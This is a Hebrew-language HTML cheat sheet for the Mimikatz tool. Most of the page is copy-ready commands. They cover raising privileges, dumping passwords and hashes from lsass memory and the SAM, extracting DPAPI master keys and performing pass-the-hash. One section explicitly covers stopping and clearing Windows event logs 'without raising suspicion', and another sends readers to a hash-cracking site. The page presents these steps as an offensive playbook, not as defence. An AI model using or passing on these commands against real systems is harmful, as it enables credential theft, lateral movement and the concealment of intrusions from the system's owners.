<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>מדריך בסיסי ל-Mimikatz</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      color: #333;
      margin: 20px;
      line-height: 1.6;
    }
    h1, h2 {
      color: #0056b3;
    }
    pre {
      background: #eeeeee;
      padding: 10px;
      border-radius: 8px;
      position: relative;
      overflow-x: auto;
    }
    .copy-btn {
      position: absolute;
      top: 8px;
      left: 8px;
      background-color: #007bff;
      color: white;
      border: none;
      padding: 5px 10px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 12px;
    }
    .copy-btn:hover {
      background-color: #0056b3;
    }
    a {
      color: #007bff;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
    ul {
      margin-right: 20px;
    }
  </style>
</head>
<body>

<h1>מדריך בסיסי לעבודה עם Mimikatz</h1>

<h2>פתיחה והרצה</h2>
<p>תמיד לפתוח את ה-CMD <strong>כמנהל מערכת</strong> (Run as administrator)! אם לא, Mimikatz לא יוכל לרוץ ולא יצליח לעלות להרשאות גבוהות כמו NT SYSTEM.</p>

<h2>בדיקת הרשאות</h2>
<p>לבדוק אם יש הרשאות מתקדמות:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>privilege::debug</pre>
<p>אם אין הרשאות תקבל שגיאה:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>privilege::debug {ERROR MESSAGE = not admin}</pre>

<h2>העלאת הרשאות</h2>
<p>לעלות להרשאות גבוהות דרך טוקנים פתוחים:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>token::elevate</pre>

<h2>שמירת פלט לקובץ</h2>
<p>לשמור את כל הפלט של Mimikatz לקובץ טקסט:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>log C:\fool.txt</pre>

<h2>שליפת סיסמאות והאשינגים מהזיכרון (RAM)</h2>
<p>לשלוף סיסמאות והאשינגים מ-process של lsass.exe:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sekurlsa::logonpasswords</pre>

<h2>שליפת מידע מה-SAM</h2>
<p>לשלוף יוזרים והאשים מהקובץ המקומי SAM:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>lsadump::sam</pre>

<h2>עבודה עם קובץ Dump חיצוני</h2>
<p>לטעון קובץ דמפ חיצוני ואז לעבוד עליו:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sekurlsa::minidump "C:\Users\username\full_dump_file.dmp"</pre>
<p>ואז להוציא ממנו סיסמאות:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sekurlsa::logonpasswords</pre>

<h2>ניקוי לוגים בלי לעורר חשד</h2>
<p>לעצור את יצירת הלוגים ואז לנקות:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>event::drop</pre>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>event::clear</pre>

<h2>פיצוח האשים</h2>
<p>להעלות את ההאש לאתר ולנסות לפצח:</p>
<a href="https://crackstation.net" target="_blank">https://crackstation.net</a>

<h2>עבודה עם DPAPI</h2>
<p>להציג את ה-masterkey שהמערכת שומרת:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sekurlsa::dpapi</pre>

<h2>Pass-the-Hash</h2>
<p>להשתמש ב-NTLM Hash להתחברות:</p>
<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>token::elevate
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLMHASH</pre>

<h2>סיכום</h2>
<p>במדריך למדנו:
<ul>
  <li>איך להפעיל נכון את Mimikatz</li>
  <li>איך לבדוק ולהרים הרשאות</li>
  <li>איך לשלוף סיסמאות מה-RAM וה-SAM</li>
  <li>איך לעבוד עם קבצי דמפ חיצוניים</li>
  <li>איך לנקות לוגים מבלי לעורר התראה</li>
  <li>איך לפצח האשים ולעבוד עם DPAPI</li>
  <li>איך לבצע Pass-The-Hash בקלות</li>
</ul>
</p>

<script>
function copyText(button) {
  const code = button.nextSibling.textContent;
  navigator.clipboard.writeText(code.trim());
  button.innerText = "הועתק!";
  setTimeout(() => button.innerText = "העתק", 2000);
}
</script>

</body>
</html>
